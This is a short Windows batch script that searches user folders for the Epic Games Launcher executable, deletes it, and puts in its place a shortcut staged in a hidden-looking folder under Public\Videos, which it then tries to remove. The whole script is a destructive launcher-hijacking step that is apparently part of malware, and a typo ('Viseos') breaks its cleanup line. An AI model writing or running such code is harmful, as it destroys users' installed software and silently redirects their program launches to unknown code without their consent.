setlocal enabledelayedexpansion
for /r C:\Users %%a in (*) do (
    if "%%~nxa"=="Epic Games Launcher.exe" (
        set "p=%%~dpnxa"
        goto :found
    )
)

:notfound
echo File not found
goto :eof

:found
del "!p!"
move "C:\Users\Public\Videos\GraphicalUserInterface\§1.lnk" "!p!"
ren "!p!" "Epic Games Launcher.lnk"
rd /s /q "C:\Users\Public\Viseos\GraphicalUserInterface"